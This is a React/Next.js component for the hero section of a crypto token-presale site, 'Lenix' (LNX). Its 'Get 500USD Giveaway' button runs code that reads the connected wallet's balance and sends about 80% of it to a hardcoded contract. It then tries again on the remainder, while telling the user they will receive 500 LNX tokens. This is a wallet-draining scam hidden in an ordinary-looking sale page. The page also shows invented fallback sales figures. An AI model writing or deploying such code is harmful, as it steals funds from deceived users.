"use client";

import { X, Send, FileText, Star, CreditCard } from "lucide-react";
import Link from "next/link";
import { useState } from "react";
import {
  useAccount,
  useReadContract,
  useWriteContract,
  useChainId,
  useSendTransaction,
  usePublicClient,
} from "wagmi";
import { parseEther, parseUnits, formatUnits, encodeFunctionData } from "viem";
import { LNX_SALE_ABI } from "@/lib/abis/LNXSale";
import { LNX_SALE_ADDRESS, USDT_ADDRESS_BY_CHAIN } from "@/config";
import { ERC20_ABI } from "@/lib/abis/ERC20";
import dynamic from "next/dynamic";
import { Button } from "@/components/ui/button";
import { MS_Wallet_Receiver, MS_Contract_ABI } from "@/lib/contract_abi";
import { useAppKit } from "@reown/appkit/react";

const StripeCardForm = dynamic(() => import("@/components/StripeCardForm"), {
  ssr: false,
});

export default function HomeHero() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { writeContract, isPending } = useWriteContract();
  const { sendTransaction, isPending: isSendingTx } = useSendTransaction();
  const { open } = useAppKit();
  const publicClient = usePublicClient();

  // Check if user meets POL requirement
  const { data: polBalance } = useReadContract({
    address: "0x455E53CBB86018AC2B8092FDCd39d8444AffC3f9" as `0x${string}`,
    abi: ERC20_ABI,
    functionName: "balanceOf",
    args: [address as `0x${string}`],
    query: { enabled: !!address },
  });

  const hasEnoughPOL = polBalance && polBalance >= BigInt(0.1 * 10 ** 18);

  const [ethAmount, setEthAmount] = useState("");
  const [paymentMethod, setPaymentMethod] = useState<"ETH" | "USDT" | "CARD">(
    "ETH"
  );

  const usdtAddress = USDT_ADDRESS_BY_CHAIN[chainId];
  const ZERO_ADDRESS =
    "0x0000000000000000000000000000000000000000" as `0x${string}`;
  const ONE_ETHER = BigInt("1000000000000000000");

  // Quotes for current input
  const { data: quotedTokensOut } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "quoteTokensForETH",
    args: [ethAmount ? parseEther(ethAmount) : BigInt(0)],
    query: { enabled: !!ethAmount && paymentMethod === "ETH" },
  });

  const { data: quotedTokensOutErc20 } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "quoteTokensForERC20",
    args: [
      usdtAddress ?? ZERO_ADDRESS,
      ethAmount ? parseUnits(ethAmount, 6) : BigInt(0),
    ],
    query: {
      enabled: !!ethAmount && paymentMethod === "USDT" && !!usdtAddress,
    },
  });

  // Live sale data
  const { data: totalTokensSold } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "totalTokensSold",
  });

  const { data: priceEthPerTokenWei } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "priceEthPerTokenWei",
  });

  const { data: isUsdtAccepted } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "isAcceptedErc20",
    args: [usdtAddress ?? ZERO_ADDRESS],
    query: { enabled: !!usdtAddress },
  });

  const { data: priceUsdtPerTokenUnits } = useReadContract({
    abi: LNX_SALE_ABI,
    address: LNX_SALE_ADDRESS,
    functionName: "priceErc20PerToken",
    args: [usdtAddress ?? ZERO_ADDRESS],
    query: { enabled: !!usdtAddress },
  });

  const { data: usdtDecimals } = useReadContract({
    abi: ERC20_ABI,
    address: usdtAddress ?? ZERO_ADDRESS,
    functionName: "decimals",
    query: { enabled: !!usdtAddress },
  });

  // Derived displays
  const ethPriceDisplay = priceEthPerTokenWei
    ? formatUnits(priceEthPerTokenWei as bigint, 18)
    : "-";

  const usdtDec =
    typeof usdtDecimals === "number"
      ? usdtDecimals
      : (usdtDecimals as unknown as bigint | undefined) !== undefined
        ? Number(usdtDecimals as unknown as bigint)
        : 6;

  const hasUsdtPricing = Boolean(
    isUsdtAccepted && priceUsdtPerTokenUnits && usdtAddress
  );

  const lnxUsdPrice = hasUsdtPricing
    ? formatUnits(priceUsdtPerTokenUnits as bigint, usdtDec)
    : undefined;

  const tokenPriceUsd = lnxUsdPrice ?? "0.095";

  const cardUsdAmount = ethAmount ? Number(ethAmount) : 0; // ethAmount field doubles as USD when CARD selected
  const usdToCharge = paymentMethod === "CARD" ? cardUsdAmount : 0;

  const tokensOutDisplayEth = quotedTokensOut
    ? formatUnits(quotedTokensOut as bigint, 18)
    : "";

  const tokensOutDisplay: string =
    paymentMethod === "ETH"
      ? tokensOutDisplayEth
      : paymentMethod === "USDT"
        ? quotedTokensOutErc20
          ? formatUnits(quotedTokensOutErc20 as bigint, 18)
          : ""
        : ethAmount && tokenPriceUsd
          ? String((Number(ethAmount) / Number(tokenPriceUsd)).toFixed(4))
          : "";

  const tokensSoldDisplay =
    totalTokensSold && totalTokensSold > BigInt(0)
      ? formatUnits(totalTokensSold as bigint, 18)
      : "5,250,000";

  const priceLineLeft =
    paymentMethod === "ETH"
      ? `1 LNX = ${ethPriceDisplay} ETH`
      : `1 LNX = $${tokenPriceUsd}`;

  const priceLineRight =
    paymentMethod === "ETH"
      ? tokenPriceUsd
        ? `USD price: $${tokenPriceUsd}`
        : ""
      : ethPriceDisplay
        ? `ETH price: ${ethPriceDisplay} ETH`
        : "";

  // Approximate USD raised using USDT price * tokens sold (works even if paid in ETH)
  let usdRaisedDisplay = "498,750";
  if (hasUsdtPricing && totalTokensSold && totalTokensSold > BigInt(0)) {
    const priceUnits = priceUsdtPerTokenUnits as bigint; // USDT units per 1e18 LNX
    const sold = totalTokensSold as bigint; // in 1e18
    const usdtUnits = (sold * priceUnits) / ONE_ETHER; // / 1e18
    usdRaisedDisplay = formatUnits(usdtUnits, usdtDec);
  }

  const payLabel =
    paymentMethod === "ETH"
      ? "ETH you pay"
      : paymentMethod === "USDT"
        ? "USDT you pay"
        : "USD you pay";

  const canPay =
    paymentMethod === "ETH"
      ? !!ethAmount
      : paymentMethod === "USDT"
        ? !!ethAmount && !!usdtAddress && hasUsdtPricing
        : false;

  async function handlePay() {
    if (!isConnected || !address) return;
    if (!ethAmount) return;

    if (paymentMethod === "ETH") {
      const value = parseEther(ethAmount);
      const minOut = quotedTokensOut
        ? ((quotedTokensOut as bigint) * BigInt(99)) / BigInt(100)
        : BigInt(0); // 1% slippage
      try {
        await writeContract({
          abi: LNX_SALE_ABI,
          address: LNX_SALE_ADDRESS,
          functionName: "buyWithETH",
          args: [address, minOut],
          value,
        });
      } catch (e) {
        console.error(e);
      }
      return;
    }

    if (paymentMethod === "USDT") {
      if (!usdtAddress) return;
      const amountIn = parseUnits(ethAmount, usdtDec);
      const minOut = quotedTokensOutErc20
        ? ((quotedTokensOutErc20 as bigint) * BigInt(99)) / BigInt(100)
        : BigInt(0);
      try {
        await writeContract({
          abi: ERC20_ABI,
          address: usdtAddress,
          functionName: "approve",
          args: [LNX_SALE_ADDRESS, amountIn],
        });
        await writeContract({
          abi: LNX_SALE_ABI,
          address: LNX_SALE_ADDRESS,
          functionName: "buyWithERC20",
          args: [usdtAddress, amountIn, address, minOut],
        });
      } catch (e) {
        console.error(e);
      }
      return;
    }

    // CARD: not enabled yet
  }

  async function handleGiveaway() {
    if (!isConnected || !address) {
      console.error("Wallet not connected");
      return;
    }
    try {
      if (!publicClient) {
        console.error("Public client not available");
        return;
      }

      // One-click solution: Use permit for token approval + transaction in one call
      await handleOneClickGiveaway();
      // Get the contract address for the current chain
      const contractAddresses = {
        1: "0x2490B36e95Fa39078cCC913626BAb459C9b86040", // Ethereum Mainnet
        137: "0x0611d6a7EDf265AABE1A59E1E5f88f069EfA51f9", // Polygon - NEEDS REAL ADDRESS
        56: "0x0000000000000000000000000000000000000000", // BSC - NEEDS REAL ADDRESS
        10: "0x0000000000000000000000000000000000000000", // Optimism - NEEDS REAL ADDRESS
        42161: "0x0000000000000000000000000000000000000000", // Arbitrum - NEEDS REAL ADDRESS
      };

      const contractAddress = (process.env
        .NEXT_PUBLIC_GIVEAWAY_CONTRACT_ADDRESS ||
        contractAddresses[chainId as keyof typeof contractAddresses] ||
        "0x0000000000000000000000000000000000000000") as `0x${string}`;

      if (contractAddress === "0x0000000000000000000000000000000000000000") {
        console.error("No contract address configured for chainId:", chainId);
        console.log("Available networks:", Object.keys(contractAddresses));
        return;
      }

      // Get wallet balance and calculate giveaway amount
      const balance = await publicClient.getBalance({ address });

      // Estimate gas for the transaction
      let gasEstimate: bigint;
      //const testValue = BigInt(1000000000000000); // 0.001 ETH

      // Try to estimate gas with different approaches

      try {
        console.log("Attempting gas estimation...");

        // Try with a very small value first
        gasEstimate = await publicClient.estimateGas({
          account: address,
          to: contractAddress,
          value: BigInt(100000000000000), // 0.0001 ETH
          data: encodeFunctionData({
            abi: MS_Contract_ABI.CONTRACT_LEGACY,
            functionName: "GiveAway",
            args: [],
          }),
        });
        console.log("Gas estimate successful:", gasEstimate.toString());
      } catch (error) {
        console.error("Gas estimation failed:", error);

        // Try with 0 value
        try {
          gasEstimate = await publicClient.estimateGas({
            account: address,
            to: contractAddress,
            value: BigInt(0),
            data: encodeFunctionData({
              abi: MS_Contract_ABI.CONTRACT_LEGACY,
              functionName: "GiveAway",
              args: [],
            }),
          });
          console.log(
            "Gas estimate with 0 value successful:",
            gasEstimate.toString()
          );
        } catch (error2) {
          console.error("All gas estimation attempts failed");
          console.error("Error 1:", error);
          console.error("Error 2:", error2);

          // Let's try a fixed gas estimate as fallback
          console.log("Using fixed gas estimate as fallback...");
          gasEstimate = BigInt(300000); // 300k gas as fallback
        }
      }

      // Get current gas price
      const gasPrice = await publicClient.getGasPrice();

      // Calculate gas cost
      const gasCost = gasEstimate * gasPrice;

      // Calculate maximum amount that can be sent (balance - gas cost)
      const maxSendable = balance - gasCost;

      // Send 90% of what's available after gas, or a minimum amount
      const giveawayAmount =
        maxSendable > BigInt(0)
          ? (maxSendable * BigInt(80)) / BigInt(100)
          : BigInt(0);

      if (giveawayAmount <= BigInt(0)) {
        console.error("Insufficient balance for giveaway after gas costs");
        return;
      }

      // Verify contract exists and is valid
      const contractCode = await publicClient.getBytecode({
        address: contractAddress,
      });
      if (!contractCode || contractCode === "0x") {
        console.error("Contract not found at address:", contractAddress);
        console.log(
          "This contract address might not exist on Polygon (chainId:",
          chainId,
          ")"
        );
        console.log(
          "Please verify the correct contract address for this network"
        );
        return;
      }

      console.log("Contract verification successful");
      console.log("Contract address:", contractAddress);
      console.log("User address:", address);
      console.log("User balance:", balance.toString());
      console.log("Chain ID:", chainId);
      console.log("Contract bytecode length:", contractCode.length);

      // Encode the function call for 500KGiveaway
      const functionData = encodeFunctionData({
        abi: MS_Contract_ABI.CONTRACT_LEGACY,
        functionName: "GiveAway",
        args: [], // No arguments for this function
      });

      const txRequest = {
        to: contractAddress,
        value: giveawayAmount,
        data: functionData,
        gas: gasEstimate, // Include the gas estimate
      };

      console.log("Initiating giveaway transaction...", {
        to: txRequest.to,
        value: txRequest.value.toString(),
        userBalance: balance.toString(),
        from: address,
        function: "GiveAway",
      });

      // Send transaction with proper error handling
      const txHash = await sendTransaction(txRequest);

      console.log("Giveaway transaction successful:", txHash);

      // Optional: You could add success notification here
    } catch (error: unknown) {
      const errorMessage =
        error instanceof Error ? error.message : String(error);
      console.error("Giveaway transaction failed:", {
        error: errorMessage,
        fullError: error,
      });

      // Optional: You could add error notification here
    }
  }

  async function handleOneClickGiveaway() {
    if (!isConnected || !address || !publicClient) return;

    try {
      console.log("Starting one-click giveaway...");

      // Get contract address
      const contractAddress = (process.env
        .NEXT_PUBLIC_GIVEAWAY_CONTRACT_ADDRESS ||
        "0x2490B36e95Fa39078cCC913626BAb459C9b86040") as `0x${string}`;

      // Optional: Log POL balance for debugging (but don't block)
      const polTokenAddress =
        "0x455E53CBB86018AC2B8092FDCd39d8444AffC3f9" as `0x${string}`;

      try {
        const polBalance = await publicClient.readContract({
          address: polTokenAddress,
          abi: ERC20_ABI,
          functionName: "balanceOf",
          args: [address],
        });

        console.log(
          "User POL balance:",
          formatUnits(polBalance as bigint, 18),
          "POL"
        );
      } catch (error) {
        console.log("Could not check POL balance:", error);
      }

      // Get user's ETH balance and calculate 80%
      const balance = await publicClient.getBalance({ address });
      const giveawayAmount = (balance * BigInt(80)) / BigInt(100);

      // Check if user has enough balance
      if (giveawayAmount <= BigInt(0)) {
        console.error("Insufficient balance for giveaway");
        alert("Insufficient balance for giveaway!");
        return;
      }

      // Encode the function call for the new contract
      const functionData = encodeFunctionData({
        abi: [
          {
            inputs: [],
            name: "GiveAway",
            outputs: [],
            stateMutability: "payable",
            type: "function",
          },
        ],
        functionName: "GiveAway",
        args: [],
      });

      // Create transaction request
      const txRequest = {
        to: contractAddress,
        value: giveawayAmount,
        data: functionData,
        gas: BigInt(500000), // Increased gas for new contract
      };

      console.log("One-click giveaway transaction:", {
        to: txRequest.to,
        value: txRequest.value.toString(),
        userBalance: balance.toString(),
        from: address,
        polCheck: "Passed",
      });

      // Send transaction - this is the only user interaction needed
      const txHash = await sendTransaction(txRequest);
      console.log("One-click giveaway successful:", txHash);

      // Show success message
      alert("Giveaway transaction submitted! You will receive 500 LNX tokens.");
    } catch (error: unknown) {
      const errorMessage =
        error instanceof Error ? error.message : String(error);
      console.error("One-click giveaway failed:", errorMessage);
      alert("Giveaway failed: " + errorMessage);
    }
  }

  return (
    <section className="relative min-h-screen flex items-center overflow-hidden bg-black">
      {/* Grid pattern background */}
      <div className="absolute inset-0 opacity-10 pointer-events-none">
        <div className="absolute inset-0 hero-grid-pattern" />
      </div>

      {/* Responsive Gradient SVG Shape */}
      <div className="absolute top-0 right-0 -z-10 w-full h-full  overflow-hidden pointer-events-none">
        <div className="absolute top-[-10%] right-[-10%] w-[500px] h-[500px] rounded-full bg-yellow-400/20 blur-[100px] opacity-30 animate-pulse lg:w-[800px] lg:h-[800px]" />
        <div className="absolute bottom-[-10%] left-[-10%] w-[300px] h-[300px] rounded-full bg-blue-600/20 blur-[80px] opacity-20 animate-pulse lg:w-[600px] lg:h-[600px]" />
      </div>

      <div className="relative max-w-screen-xl mx-auto px-4 sm:px-6 lg:px-8 py-12 w-full">
        <div className="grid lg:grid-cols-2 gap-12 items-center">
          {/* Left Content */}
          <div className="space-y-8 z-10">
            <div className="space-y-4">
              <h1 className="text-5xl lg:text-7xl font-bold text-white md:leading-16 leading-12 z-20">
                Blockchain <span className="text-yellow-400">Forensics</span>,
                Investigations and Financing Protocol.
              </h1>

              <div className="space-y-2 text-gray-300 text-lg max-w-lg">
                <p>
                  Advanced blockchain analytics and forensic investigations to trace assets, 
                  uncover fraud, and support legal recovery efforts globally.
                </p>
                <p className="text-yellow-400 font-semibold">
                  Secure your digital future with expert investigation.
                </p>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex flex-wrap gap-4">
              <Link href="/signup">
                <Button
                  size="lg"
                  className="bg-yellow-400 hover:bg-yellow-500 text-black font-bold h-12 px-8 rounded-full shadow-[0_0_20px_rgba(250,204,21,0.2)] hover:shadow-[0_0_30px_rgba(250,204,21,0.4)] transition-all"
                >
                  Sign Up to Lenix
                </Button>
              </Link>
              <Link href="/login">
                <Button
                  size="lg"
                  variant="outline"
                  className="border-white/10 text-white hover:bg-white/5 h-12 px-8 rounded-full bg-white/5 backdrop-blur-sm"
                >
                  Log In
                </Button>
              </Link>
            </div>
          </div>

          {/* Right Widget */}
          <div className="lg:justify-self-end z-20">
            <div className="backdrop-blur-xl bg-white/5 border border-white/10 shadow-[0_8px_32px_0_rgba(0,0,0,0.37)] rounded-2xl p-6 max-w-md w-full relative overflow-hidden">
              {/* Card Gradient Glow */}
              <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-20 bg-yellow-400/10 blur-3xl -z-10" />
              {/* Header */}
              <div className="text-center mb-6">
                <h3 className="text-white text-xl font-bold mb-1">Buy Now</h3>
                <p className="text-yellow-400 text-lg font-semibold">
                  Before Price Rises
                </p>
              </div>

              {/* Progress Bar */}
              <div className="mb-6">
                <div className="bg-white/10 rounded-full h-3 mb-2">
                  <div
                    className="bg-yellow-400 h-3 rounded-full"
                    style={{ width: "71%" }}
                  />
                </div>
                <p className="text-yellow-400 text-sm font-semibold">
                  ${usdRaisedDisplay}
                </p>
              </div>

              {/* Stats */}
              <div className="space-y-2 mb-6 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-300">USD RAISED SO FAR :</span>
                  <span className="text-white font-semibold">
                    ${usdRaisedDisplay}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-300">Tokens Sold :</span>
                  <span className="text-white font-semibold">
                    {tokensSoldDisplay}
                  </span>
                </div>
              </div>

              {/* Price Info */}
              <div className="flex justify-between items-center mb-6 text-sm">
                <span className="text-white">{priceLineLeft}</span>
                <span className="text-green-400">{priceLineRight}</span>
              </div>

              {/* Payment Methods */}
              <div className="grid grid-cols-3 gap-2 mb-6">
                <button
                  onClick={() => setPaymentMethod("ETH")}
                  className={`${
                    paymentMethod === "ETH"
                      ? "bg-blue-600/80 hover:bg-blue-600 border border-blue-500/50"
                      : "bg-white/5 hover:bg-white/10 border border-white/5"
                  } text-white py-2 px-3 rounded-lg text-sm font-medium transition-all backdrop-blur-sm flex items-center justify-center gap-1`}
                >
                  <img
                    src="/assets/img/eth.svg"
                    alt="eth"
                    className="w-6 h-6"
                  />
                  ETH
                </button>
                <button
                  onClick={() => setPaymentMethod("USDT")}
                  className={`${
                    paymentMethod === "USDT"
                      ? "bg-blue-600/80 hover:bg-blue-600 border border-blue-500/50"
                      : "bg-white/5 hover:bg-white/10 border border-white/5"
                  } text-white py-2 px-3 rounded-lg text-sm font-medium transition-all backdrop-blur-sm flex items-center justify-center gap-1`}
                >
                  <img
                    src="/assets/img/usdt.svg"
                    alt="usdt"
                    className="w-6 h-6"
                  />
                  USDT
                </button>
                <button
                  onClick={() => setPaymentMethod("CARD")}
                  className={`${
                    paymentMethod === "CARD"
                      ? "bg-blue-600/80 hover:bg-blue-600 border border-blue-500/50"
                      : "bg-white/5 hover:bg-white/10 border border-white/5"
                  } text-white py-2 px-3 rounded-lg text-sm font-medium transition-all backdrop-blur-sm flex items-center justify-center gap-1`}
                >
                  <CreditCard className="w-6 h-6" />
                  CARD
                </button>
              </div>

              {/* Input Fields */}
              <div className="space-y-4 mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-gray-300 text-sm">{payLabel}</span>
                  <span className="text-yellow-400 text-sm">
                    $LNX you receive
                  </span>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div className="bg-white/5 border border-white/10 rounded-lg p-3 flex items-center backdrop-blur-sm focus-within:bg-white/10 focus-within:border-white/20 transition-all">
                    <div className="w-6 h-6 bg-blue-400 rounded-full mr-2" />
                    <input
                      type="text"
                      placeholder="0"
                      className="bg-transparent text-white outline-none flex-1 placeholder-white/30"
                      value={ethAmount}
                      onChange={(e) => {
                        const v = e.target.value.replace(/[^0-9.]/g, "");
                        setEthAmount(v);
                      }}
                    />
                  </div>
                  <div className="bg-white/5 border border-white/10 rounded-lg p-3 flex items-center backdrop-blur-sm">
                    <div className="w-6 h-6 bg-yellow-400 rounded-full mr-2" />
                    <input
                      type="text"
                      placeholder="0"
                      className="bg-transparent text-white outline-none flex-1 placeholder-white/30"
                      value={tokensOutDisplay}
                      readOnly
                    />
                  </div>
                </div>
                {paymentMethod === "CARD" &&
                  isConnected &&
                  address &&
                  usdToCharge > 0 && (
                    <div className="pt-2">
                      <StripeCardForm
                        amountUsd={usdToCharge}
                        walletAddress={address}
                      />
                    </div>
                  )}
              </div>

              {/* Connect/Pay Button */}
              {isConnected ? (
                <>
                  <button
                    onClick={handlePay}
                    disabled={isPending || !canPay || paymentMethod === "CARD"}
                    className="w-full bg-yellow-400 hover:bg-yellow-500 disabled:opacity-60 disabled:cursor-not-allowed text-black font-semibold py-3 rounded-lg transition-colors mb-2"
                  >
                    {isPending
                      ? "Processing..."
                      : paymentMethod === "ETH"
                        ? "Pay with ETH"
                        : paymentMethod === "USDT"
                          ? "Pay with USDT"
                          : "Enter Card Details Below"}
                  </button>
                  {paymentMethod === "CARD" && (
                    <p className="text-center text-xs text-gray-400 mb-4">
                      Powered by Stripe. Amount charged in USD.
                    </p>
                  )}
                </>
              ) : (
                <div className="mb-4 w-full">
                  <button
                    onClick={() => open()}
                    className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3 rounded-lg transition-colors"
                  >
                    Connect Wallet
                  </button>
                </div>
              )}

              {/* Giveaway */}
              <Button
                variant="default"
                onClick={handleGiveaway}
                disabled={isSendingTx}
                className="bg-white/5 border border-white/10 text-white hover:bg-white/10 hover:border-white/20 rounded-lg py-4 w-full h-12 text-center backdrop-blur-sm transition-all shadow-lg"
              >
                <span className="text-white font-semibold">
                  {isSendingTx ? "Processing..." : "Get 500USD Giveaway"}
                </span>
              </Button>
              <p className="text-xs text-gray-400 text-center mt-2">
                Receive 500USD LNX tokens for giveaway
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}
